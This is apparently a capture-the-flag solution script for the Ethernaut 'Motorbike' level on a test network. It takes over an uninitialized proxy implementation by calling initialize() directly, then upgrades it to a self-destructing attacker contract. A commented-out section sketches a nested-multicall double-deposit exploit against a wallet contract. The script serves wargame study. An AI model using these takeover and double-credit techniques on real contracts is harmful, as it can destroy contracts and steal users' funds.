from ctypes import addressof
from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from brownie.convert import *
from web3 import Web3

import time
import json
import os

# for local deployment: 


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# deployer=accounts[0]
# attacker=accounts[1]
# target_ct=Denial.deploy({'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x61A26BFAe07318512cB5bcFf284cE43c212E3924'
motorbike=interface.Motorbike(target_address)

# deploy attacker contract
attacker_contract=motorbikeAttack.deploy({'from': attacker, 'priority_fee': priority_fee})
# attacker.transfer(target_ct.address, 100000000000, priority_fee=priority_fee)

def main():

    # retrieve the value of the private _IMPLEMENTATION_SLOT state variable, which will give the address of the implementation contract
    # the slot is given by keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, which gives '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'

    slot_impl_addr='0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
    impl_addr=f'0x{web3.eth.get_storage_at(target_address, slot_impl_addr).hex()[-40:]}'
    print('implementation address: ', impl_addr)

    engine=interface.Engine(impl_addr)

    print('--- values addresses ---')
    print('motorbike:', motorbike.address)
    print('engine:', engine.address)
    print('attacker:', attacker)
    print('attacker_contract:', attacker_contract)

    print('--- values BEFORE attack ---')
    print('engine.upgrader(): ', engine.upgrader())
    print('engine.horsePower(): ', engine.horsePower())

    # we execute the initialize function directly on the implementation contract (was supposed to go through the proxy, but there is no control)
    tx_init=engine.initialize({'from': attacker, 'priority_fee': priority_fee})

    print('--- values after tx_init ---')
    print('engine.upgrader(): ', engine.upgrader())
    print('engine.horsePower(): ', engine.horsePower())

    # >> attecker is now the upgrader
    # now we set the new implemantation address to the address of the attacker contract which will self-destruct in the implementation context

    data=attacker_contract.self_destruct.encode_input()

    tx_attack=engine.upgradeToAndCall(attacker_contract.address, data, {'from': attacker, 'priority_fee': priority_fee})

    print('--- values after tx_attack ---')
    print('engine.upgrader(): ', engine.upgrader())
    print('engine.horsePower(): ', engine.horsePower())




    # tx_deposit=puzzleWallet.deposit({'from': attacker, 'priority_fee': priority_fee, 'amount': balance_wallet})

    # # we do a nested tx, multicall inside a multicall in order to bypass the max 1 deposit control and credit the attacker balance twice the amount deposited
    # data1=puzzleWallet.deposit.encode_input()
    # calldata2=[data1]
    # data2=puzzleWallet.multicall.encode_input(calldata2)
    # print('data1: ', data1)
    # print('data2: ', data2)

    # calldata=[data1,data2]

    # tx_nested_multi=puzzleWallet.multicall(calldata, {'from': attacker, 'priority_fee': priority_fee, 'amount': balance_wallet})

    print('--- It is over ---')
    
